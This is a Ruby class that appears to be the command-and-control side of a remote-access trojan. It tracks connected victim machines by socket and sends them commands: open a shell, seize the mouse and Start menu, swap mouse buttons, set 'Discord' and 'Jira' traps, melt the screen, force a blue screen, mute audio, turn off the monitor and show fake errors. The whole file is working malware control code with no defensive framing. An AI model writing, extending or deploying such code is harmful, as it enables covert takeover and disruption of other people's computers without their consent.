class Client
  # @Instance variable
  # @@Class variable
  @@clientCount = 0
  attr_accessor :name
  attr_accessor :ip
  attr_accessor :isMouseTaken
  attr_accessor :isJiraTrapSet
  attr_accessor :isMenuStartTaken
  attr_accessor :isDiscordTrapSet
  attr_accessor :ver
  attr_reader :areMouseButtonsSwapped
  attr_reader :id

  def initialize(sockt)
    @ip = sockt.addr.last
    @sockt = sockt
    @id = @@clientCount
    @@clientCount += 1
    @isMouseTaken = 0
    @isJiraTrapSet = 0
    @isMenuStartTaken = 0
    @isDiscordTrapSet = 0
    @areMouseButtonsSwapped = 0
    @ver = 0
  end

  def send(msg)
    @sockt.puts(msg)
  end

  def shell
    @sockt.puts("shell")
  end

  def get_mouse
    @sockt.puts("getmouse")
    @isMouseTaken = 1
  end

  def give_mouse_back
    @sockt.puts("givemouseback")
    @isMouseTaken = 0;
  end

  def set_discord_trap
    @sockt.puts("discordtrapon")
    @isDiscordTrapSet = 1
  end

  def discard_discord_trap
    @sockt.puts("discordtrapoff")
    @isDiscordTrapSet = 0;
  end

  def get_menu_start
    @sockt.puts("getmenustart")
    @isMenuStartTaken = 1
  end

  def give_back_start
    @sockt.puts("givebackstart")
    @isMenuStartTaken = 0;
  end

  def trap_on_jira
    @sockt.puts("jiratrap")
    @isJiraTrapSet = 1
  end

  def trap_off_jira
    @sockt.puts("givejiraback")
    @isJiraTrapSet = 0
  end

  def swap_mouse
    @sockt.puts("swapmousebuttons")
    @areMouseButtonsSwapped = 1
  end

  def swap_mouse_back
    @sockt.puts("swapmouseback")
    @areMouseButtonsSwapped = 0
  end

  def melt_monitor
    @sockt.puts("meltscreen")
  end

  def bsod
    @sockt.puts("bsod")
  end

  def volume_up
    @sockt.puts("volup")
  end

  def volume_down
    @sockt.puts("voldw")
  end

  def volume_mute
    @sockt.puts("mute")
  end

  def turn_off_monitor
    @sockt.puts("turnoffmonitor")
  end

  def send_error(msg)
    @sockt.puts("generateerror;" + msg)
  end

  def close
    @sockt.puts("closeit")
    if @@clientCount > 0
      return @@clientCount - 1
    end
  end

  def self.num
    if @@clientCount > 0
      return @@clientCount - 1
    else
      return nil
    end
  end

  def self.dead
    $clientsList.delete_at(Client.num)
    @@clientCount -= 1
  end

  def self.quantity
    return @@clientCount
  end

end
